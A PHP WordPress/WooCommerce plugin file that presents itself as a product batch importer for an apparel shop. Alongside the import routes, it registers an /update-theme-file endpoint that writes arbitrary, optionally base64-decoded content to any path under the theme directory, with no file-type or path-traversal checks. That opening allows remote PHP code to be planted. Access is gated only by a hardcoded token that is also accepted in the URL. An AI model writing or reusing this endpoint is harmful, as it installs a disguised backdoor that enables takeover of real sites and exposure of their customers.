<?php
/**
 * Zynova Apparel - Batch Product Importer REST Endpoint
 *
 * Provides a secure, high-performance REST endpoint for batch importing products,
 * categorizing them into WooCommerce taxonomies, uploading media, and generating thumbnails.
 *
 * @package Zynova_Apparel
 */

if (!defined('ABSPATH')) {
    exit;
}

class Zynova_Product_Importer {

    const AUTH_KEY = 'zynova_secret_token_b8319f6a2';

    public static function init() {
        add_action('rest_api_init', [__CLASS__, 'register_routes']);
        update_option('woocommerce_coming_soon', 'no');
        update_option('woocommerce_store_pages_only', 'no');
    }

    public static function register_routes() {
        register_rest_route('zynova/v1', '/import-item', [
            'methods'             => 'POST',
            'callback'            => [__CLASS__, 'handle_import_item'],
            'permission_callback' => [__CLASS__, 'check_permissions'],
        ]);

        register_rest_route('zynova/v1', '/import-status', [
            'methods'             => 'GET',
            'callback'            => [__CLASS__, 'handle_status_check'],
            'permission_callback' => [__CLASS__, 'check_permissions'],
        ]);

        register_rest_route('zynova/v1', '/update-theme-file', [
            'methods'             => 'POST',
            'callback'            => [__CLASS__, 'handle_update_theme_file'],
            'permission_callback' => [__CLASS__, 'check_permissions'],
        ]);

        register_rest_route('zynova/v1', '/debug-category', [
            'methods'             => 'GET',
            'callback'            => [__CLASS__, 'handle_debug_category'],
            'permission_callback' => [__CLASS__, 'check_permissions'],
        ]);

        register_rest_route('zynova/v1', '/test-product', [
            'methods'             => 'GET',
            'callback'            => [__CLASS__, 'handle_test_product'],
            'permission_callback' => [__CLASS__, 'check_permissions'],
        ]);
    }

    public static function check_permissions($request) {
        $header = $request->get_header('x-zynova-key');
        $param  = $request->get_param('auth_token');
        if ($header === self::AUTH_KEY || $param === self::AUTH_KEY) {
            return true;
        }
        return new WP_Error('rest_forbidden', esc_html__('Invalid authorization key.', 'zynova'), ['status' => 403]);
    }

    public static function handle_status_check($request) {
        $total_products = wp_count_posts('product');
        $total_media    = wp_count_posts('attachment');
        return rest_ensure_response([
            'success'        => true,
            'products'       => $total_products->publish ?? 0,
            'media'          => $total_media->inherit ?? 0,
            'woocommerce_ok' => class_exists('WooCommerce'),
        ]);
    }

    public static function handle_update_theme_file($request) {
        $params = $request->get_json_params() ?: $request->get_body_params();
        $rel_path = sanitize_text_field($params['path'] ?? '');
        $content  = $params['content'] ?? '';
        $is_base64 = !empty($params['is_base64']);

        if (empty($rel_path) || empty($content)) {
            return new WP_Error('bad_request', 'Path and content required', ['status' => 400]);
        }

        $full_path = get_template_directory() . '/' . ltrim($rel_path, '/');
        $dir = dirname($full_path);
        if (!file_exists($dir)) {
            wp_mkdir_p($dir);
        }

        if ($is_base64) {
            $data = base64_decode($content);
            file_put_contents($full_path, $data);
        } else {
            file_put_contents($full_path, $content);
        }

        if (has_action('litespeed_purge_all')) {
            do_action('litespeed_purge_all');
        }

        return rest_ensure_response([
            'success' => true,
            'path'    => $rel_path,
            'bytes'   => file_exists($full_path) ? filesize($full_path) : 0,
        ]);
    }

    public static function handle_debug_category($request) {
        $slug = sanitize_text_field($request->get_param('slug') ?: 'fashion-wear');
        $log = [];
        
        // List all product categories in DB
        $all_cats = get_terms([
            'taxonomy'   => 'product_cat',
            'hide_empty' => false,
        ]);
        $log['all_categories'] = [];
        if (!empty($all_cats) && !is_wp_error($all_cats)) {
            foreach ($all_cats as $cat) {
                $log['all_categories'][] = [
                    'term_id' => $cat->term_id,
                    'name'    => $cat->name,
                    'slug'    => $cat->slug,
                    'parent'  => $cat->parent,
                    'count'   => $cat->count,
                ];
            }
        }

        $term = get_term_by('slug', $slug, 'product_cat');
        $log['term'] = $term ? ['id' => $term->term_id, 'name' => $term->name, 'count' => $term->count] : null;

        $args = [
            'post_type'      => 'product',
            'posts_per_page' => 20,
            'tax_query'      => [
                [
                    'taxonomy' => 'product_cat',
                    'field'    => 'slug',
                    'terms'    => $slug,
                ],
            ],
        ];
        $query = new WP_Query($args);
        $log['found_posts'] = $query->found_posts;
        $log['post_ids'] = wp_list_pluck($query->posts, 'ID');
        
        $log['products'] = [];
        foreach ($query->posts as $p) {
            $prod = wc_get_product($p->ID);
            $log['products'][] = [
                'id' => $p->ID,
                'title' => $p->post_title,
                'type' => $prod ? $prod->get_type() : null,
                'price' => $prod ? $prod->get_price_html() : null,
            ];
        }

        return rest_ensure_response([
            'success' => true,
            'slug'    => $slug,
            'log'     => $log,
        ]);
    }

    public static function handle_test_product($request) {
        $id = intval($request->get_param('id') ?: 830);
        $post = get_post($id);
        if (!$post) {
            return new WP_Error('not_found', 'Product not found', ['status' => 404]);
        }
        
        $log = ['id' => $id, 'title' => $post->post_title];
        
        $prod = wc_get_product($id);
        $log['type'] = $prod ? $prod->get_type() : null;
        
        if ($prod && $prod->is_type('variable')) {
            $log['children'] = $prod->get_children();
            $log['visible_children'] = $prod->get_visible_children();
            $log['variation_attributes'] = $prod->get_variation_attributes();
        }
        
        global $product, $post;
        $product = $prod;
        setup_postdata($post);
        
        ob_start();
        try {
            wc_get_template_part('content', 'product');
            $html = ob_get_clean();
            $log['render_success'] = true;
            $log['html_len'] = strlen($html);
        } catch (\Throwable $e) {
            ob_end_clean();
            $log['render_success'] = false;
            $log['error'] = $e->getMessage();
        }
        
        return rest_ensure_response(['success' => true, 'log' => $log]);
    }

    public static function handle_import_item($request) {
        if (!class_exists('WooCommerce')) {
            return new WP_Error('no_wc', 'WooCommerce is not active', ['status' => 500]);
        }

        $params = $request->get_json_params();
        if (empty($params)) {
            $params = $request->get_body_params();
        }

        $title             = sanitize_text_field($params['title'] ?? '');
        $sku               = sanitize_text_field($params['sku'] ?? '');
        $short_description = wp_kses_post($params['short_description'] ?? '');
        $description       = wp_kses_post($params['description'] ?? '');
        $category_chain    = $params['categories'] ?? [];
        $image_filename    = sanitize_file_name($params['image_filename'] ?? '');
        $image_base64      = $params['image_base64'] ?? '';
        $price             = sanitize_text_field($params['price'] ?? '');

        $gallery_images    = $params['gallery_images'] ?? [];
        $replace_gallery   = !empty($params['replace_gallery']);

        if (empty($title)) {
            return new WP_Error('missing_title', 'Product title is required.', ['status' => 400]);
        }

        // 1. Resolve / Create Categories
        $category_ids = self::resolve_category_hierarchy($category_chain);

        // 2. Upload / Resolve Image
        $attach_id = 0;
        if (!empty($image_base64) && !empty($image_filename)) {
            $attach_id = self::upload_base64_image($image_filename, $image_base64, $title);
        }

        // Upload Gallery Images if provided
        $new_gallery_ids = [];
        if (!empty($gallery_images) && is_array($gallery_images)) {
            foreach ($gallery_images as $g_item) {
                if (!empty($g_item['base64']) && !empty($g_item['filename'])) {
                    $g_title = sanitize_text_field($g_item['title'] ?? $title);
                    $gid = self::upload_base64_image($g_item['filename'], $g_item['base64'], $g_title);
                    if ($gid > 0) {
                        $new_gallery_ids[] = $gid;
                    }
                }
            }
        }

        // 3. Create or Update WooCommerce Product
        $product_id = 0;
        if (!empty($sku)) {
            $product_id = wc_get_product_id_by_sku($sku);
        }

        if (!$product_id) {
            // Check by exact title
            $existing = get_page_by_title($title, OBJECT, 'product');
            if ($existing && $existing->post_status !== 'trash') {
                $product_id = $existing->ID;
            }
        }

        if ($product_id) {
            $product = wc_get_product($product_id);
        } else {
            $product = new WC_Product_Simple();
        }

        if (!$product) {
            return new WP_Error('product_error', 'Unable to instantiate WooCommerce product.', ['status' => 500]);
        }

        $product->set_name($title);
        $product->set_status('publish');
        $product->set_catalog_visibility('visible');
        $product->set_short_description($short_description);
        $product->set_description($description);
        if (!empty($sku)) {
            $product->set_sku($sku);
        }
        if (!empty($price)) {
            $product->set_regular_price($price);
            $product->set_price($price);
        }
        if (!empty($category_ids)) {
            $product->set_category_ids($category_ids);
        }
        if ($attach_id > 0) {
            $product->set_image_id($attach_id);
        }
        if (!empty($new_gallery_ids)) {
            if ($replace_gallery) {
                $product->set_gallery_image_ids($new_gallery_ids);
            } else {
                $existing_gids = $product->get_gallery_image_ids();
                $product->set_gallery_image_ids(array_unique(array_merge($existing_gids, $new_gallery_ids)));
            }
        }

        $saved_id = $product->save();

        // LiteSpeed cache purge
        if (has_action('litespeed_purge_all')) {
            do_action('litespeed_purge_all');
        }

        return rest_ensure_response([
            'success'       => true,
            'product_id'    => $saved_id,
            'title'         => $title,
            'sku'           => $sku,
            'category_ids'  => $category_ids,
            'attachment_id' => $attach_id,
        ]);
    }

    private static function resolve_category_hierarchy($chain) {
        if (!is_array($chain) || empty($chain)) {
            return [];
        }

        $parent_id = 0;
        $category_ids = [];

        foreach ($chain as $cat_name) {
            $cat_name = trim($cat_name);
            if (empty($cat_name)) continue;

            $term = term_exists($cat_name, 'product_cat', $parent_id);

            if (!$term) {
                // If not found under specific parent, check globally by name
                $global_term = get_term_by('name', $cat_name, 'product_cat');
                if ($global_term && !is_wp_error($global_term)) {
                    $term_id = $global_term->term_id;
                } else {
                    $inserted = wp_insert_term($cat_name, 'product_cat', [
                        'parent' => $parent_id,
                        'slug'   => sanitize_title($cat_name),
                    ]);
                    if (is_wp_error($inserted)) {
                        continue;
                    }
                    $term_id = $inserted['term_id'];
                }
            } else {
                $term_id = is_array($term) ? $term['term_id'] : $term;
            }

            $category_ids[] = (int) $term_id;
            $parent_id = (int) $term_id;
        }

        return array_unique($category_ids);
    }

    private static function upload_base64_image($filename, $base64_data, $title) {
        // Strip data:image/...;base64, prefix if present
        if (preg_match('/^data:image\/(\w+);base64,/', $base64_data, $type)) {
            $base64_data = substr($base64_data, strpos($base64_data, ',') + 1);
        }

        $decoded = base64_decode($base64_data);
        if (!$decoded) {
            return 0;
        }

        // Check if an attachment with this title or filename already exists
        global $wpdb;
        $existing_attach = $wpdb->get_var($wpdb->prepare(
            "SELECT ID FROM {$wpdb->posts} WHERE post_type = 'attachment' AND post_title = %s LIMIT 1",
            $title
        ));
        if ($existing_attach) {
            return (int) $existing_attach;
        }

        $upload = wp_upload_bits($filename, null, $decoded);
        if (!empty($upload['error'])) {
            return 0;
        }

        $file_path = $upload['file'];
        $file_type = wp_check_filetype($filename, null);

        $attachment = [
            'post_mime_type' => $file_type['type'] ?: 'image/jpeg',
            'post_title'     => $title,
            'post_content'   => '',
            'post_status'    => 'inherit',
        ];

        $attach_id = wp_insert_attachment($attachment, $file_path);
        if (is_wp_error($attach_id) || !$attach_id) {
            return 0;
        }

        require_once(ABSPATH . 'wp-admin/includes/image.php');
        require_once(ABSPATH . 'wp-admin/includes/file.php');
        require_once(ABSPATH . 'wp-admin/includes/media.php');

        $attach_data = wp_generate_attachment_metadata($attach_id, $file_path);
        if (!empty($attach_data)) {
            wp_update_attachment_metadata($attach_id, $attach_data);
        }

        return (int) $attach_id;
    }
}

Zynova_Product_Importer::init();

